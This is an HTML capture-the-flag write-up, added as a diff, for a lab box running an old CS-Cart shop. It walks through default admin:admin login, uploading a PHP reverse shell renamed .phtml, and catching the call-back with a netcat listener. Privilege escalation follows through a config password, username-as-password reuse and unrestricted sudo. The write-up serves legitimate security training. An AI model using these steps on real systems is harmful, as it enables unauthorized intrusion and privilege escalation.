@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PayDay &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>PayDay</h1>
+    <div class="meta">Target: <code>192.168.180.39</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">CSCart</span><span class="tag">DefaultCreds</span><span class="tag">AuthenticatedRCE</span><span class="tag">FileUpload</span><span class="tag">PasswordReuse</span><span class="tag">Sudo</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#version-identification">Version Identification</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#default-credentials">Default Credentials</a><a class="lvl3" href="#authenticated-rce-via-template-file-upload">Authenticated RCE via Template File Upload</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#credential-hunting-in-config">Credential Hunting in Config</a><a class="lvl3" href="#unrestricted-sudo">Unrestricted Sudo</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>PayDay is a Linux box running a very old CS-Cart e-commerce installation. Default admin credentials open the panel, a file upload bypass in the template editor yields a <code>www-data</code> shell, and from there credential hunting in a config file plus classic password reuse chains up to a user with full unrestricted sudo.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1
+80/tcp  open  http        Apache httpd 2.2.4 (Ubuntu) PHP/5.2.3
+110/tcp open  pop3        Dovecot pop3d
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 3.0.26a
+993/tcp open  ssl/imap    Dovecot imapd
+995/tcp open  ssl/pop3    Dovecot pop3d
+</code></pre>
+<p>The Apache banner and title line name the application:</p>
+<pre><code>CS-Cart. Powerful PHP shopping cart software
+</code></pre>
+<h3 id="version-identification">Version Identification</h3>
+<pre><code>http://192.168.180.39/?version  -&gt;  CS-CART: version 1.3.3
+</code></pre>
+<p>Searching ExploitDB for this version yields:</p>
+<p><strong>CS-Cart 1.3.3 - Authenticated RCE</strong>
+https://www.exploit-db.com/exploits/48891</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="default-credentials">Default Credentials</h3>
+<p>Before running any exploit, try the vendor default. CS-Cart's default admin login worked immediately:</p>
+<pre><code>admin : admin  -&gt;  http://192.168.180.39/admin.php
+</code></pre>
+<blockquote>
+<p><strong>Why defaults persist:</strong> Out-of-the-box admin credentials exist so the first setup isn't locked out. On a system this old (Ubuntu with PHP 5.2 from 2007), the installation was almost certainly never hardened.</p>
+</blockquote>
+<h3 id="authenticated-rce-via-template-file-upload">Authenticated RCE via Template File Upload</h3>
+<p>The RCE technique works through the Look and Feel template editor, which allows file uploads. The bypass is renaming a PHP reverse shell to <code>.phtml</code>, a PHP-executable extension that the file type check doesn't block:</p>
+<ol>
+<li>Log into <code>/admin.php</code></li>
+<li>Navigate to Look and Feel &gt; Template Editor</li>
+<li>Upload <code>php-reverse-shell.php</code> renamed to <code>.phtml</code></li>
+<li>Browse to <code>http://192.168.180.39/skins/&lt;filename&gt;.phtml</code></li>
+</ol>
+<p>Reverse shell lands as <code>www-data</code> on port 53:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.39] 48176
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-python">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="credential-hunting-in-config">Credential Hunting in Config</h3>
+<p>LinPEAS surfaces a database password in the CS-Cart config:</p>
+<pre><code>/var/www/config.php:$db_password = 'root';
+═╣ MySQL connection using default root/root ........... Yes
+</code></pre>
+<p>A user <code>‹redacted›</code> was visible on the system. Given that <code>admin:admin</code> worked for the web app, testing <code>‹redacted›:‹redacted›</code> as a direct <code>su</code> was a reasonable guess:</p>
+<pre><code class="language-sh">www-data@payday:/root$ su ‹redacted›
+Password: ‹redacted›
+
+‹redacted›@payday:/root$ whoami
+‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Password reuse in old systems:</strong> On systems this vintage, account passwords frequently mirror the account name or a shared admin password. Always try username-as-password after any foothold.</p>
+</blockquote>
+<h3 id="unrestricted-sudo">Unrestricted Sudo</h3>
+<pre><code class="language-sh">User ‹redacted› may run the following commands on this host:
+    (ALL) ALL
+</code></pre>
+<p>Patrick has full, passwordless sudo over everything:</p>
+<pre><code class="language-sh">sudo /bin/bash
+root@payday:/root# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@payday:/root# cat proof.txt
+‹redacted›
+</code></pre>
+<p>Local flag was also accessible as ‹redacted›:</p>
+<pre><code class="language-sh">‹redacted›@payday:~$ cat local.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Check default credentials before loading any exploit.</strong> <code>admin:admin</code> handed over the entire attack surface here, no CVE needed for the foothold.</li>
+<li><strong><code>.phtml</code> is a common extension bypass.</strong> Upload filters that block <code>.php</code> often miss <code>.phtml</code>, <code>.php5</code>, <code>.phar</code>, and other PHP-executable extensions.</li>
+<li><strong>Old systems have weak password hygiene.</strong> Trying <code>username:username</code> is always worth a quick attempt, especially on systems that have never been audited.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
